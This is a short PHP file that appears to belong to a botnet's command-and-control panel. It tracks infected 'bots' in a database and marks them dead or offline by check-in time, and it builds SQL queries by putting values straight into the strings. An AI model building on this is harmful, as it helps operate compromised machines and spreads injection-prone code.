<?php
@session_start();

    if (!isset($_SESSION['login'])) {
        header('Location: index.php');
        exit();
    }
	
    include_once('config.php');
	
	    $check = mysql_query("SELECT * FROM bots WHERE status != 'Dead'");
	    $time = time();
        $hours = 172800;
	
	    while($row = mysql_fetch_array($check)) {
            $id = $row['id'];
            $lasttime = $row['time'];
            $processedtime = $time - $hours;
		
            if ($lasttime <= $processedtime){
                mysql_query("UPDATE bots SET status = 'Dead' WHERE id LIKE '$id'");
            }
        }
            
        $check2 = mysql_query("SELECT * FROM bots WHERE status LIKE 'Online'");
        $mins = $bot_delay + 5;
            
        while($row1 = mysql_fetch_array($check2)) {
            $id1 = $row1['id'];
            $lasttime1 = $row1['time'];
            $processedtime1 = $time - $mins;
	    	
            if ($lasttime1 <= $processedtime1){
                mysql_query("UPDATE bots SET status = 'Offline' WHERE id LIKE '$id1'");
            }
        }
?>